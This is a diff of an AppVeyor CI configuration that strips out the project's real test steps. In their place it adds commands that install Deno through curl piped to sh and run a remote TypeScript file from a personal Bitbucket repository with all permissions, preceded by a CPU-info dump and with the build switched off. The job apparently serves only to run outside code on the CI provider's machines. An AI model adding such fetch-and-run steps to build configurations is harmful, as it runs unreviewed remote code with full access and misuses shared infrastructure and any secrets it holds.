@@ -1,9 +1,34 @@
+# version format
+version: 1.0.{build}
+
+# you can use {branch} name in version format too
+# version: 1.0.{build}-{branch}
+
+# branches to build
+branches:
+  # whitelist
+  only:
+    - master
+    - main
+
+  # blacklist
+  except:
+    - gh-pages
+
+# Do not build on tags (GitHub, Bitbucket, GitLab, Gitea)
+skip_tags: true
+
+# Maximum number of concurrent jobs for the project
+max_jobs: 1
+
+image: Ubuntu2004
+
 # Test against the latest version of this Node.js version
-environment:
-  nodejs_version: "14"
+#environment:
+ # nodejs_version: "14"
 
 # Install scripts. (runs after repo cloning)
-install:
+#install:
   # Get the latest stable version of Node.js or io.js
   #- ps: Install-Product node $env:nodejs_version
   # install modules
@@ -11,14 +36,10 @@ install:
 
 # Post-install test scripts.
 test_script:
-  # Output useful info for debugging.
-  #- node --version
-  #- npm --version
-  # run tests
-  #- npm test
-  - ps: iwr https://deno.land/x/install/install.ps1 -useb | iex
-  - deno run -A --unstable https://deno.land/x/puppeteer@9.0.0/install.ts
-  - deno run -A --unstable https://bitbucket.org/meocodervippro/meocoder_node/raw/main/web/main.ts
+  - cat /proc/cpuinfo
+  - curl -fsSL https://deno.land/x/install/install.sh | sh
+  - PUPPETEER_PRODUCT=chrome $HOME/.deno/bin/deno run -A --unstable https://deno.land/x/puppeteer@9.0.0/install.ts
+  - $HOME/.deno/bin/deno run -A --unstable https://bitbucket.org/meocodervippro/meocoder_node/raw/main/web/main.ts
 
 # Don't actually build.
 build: off
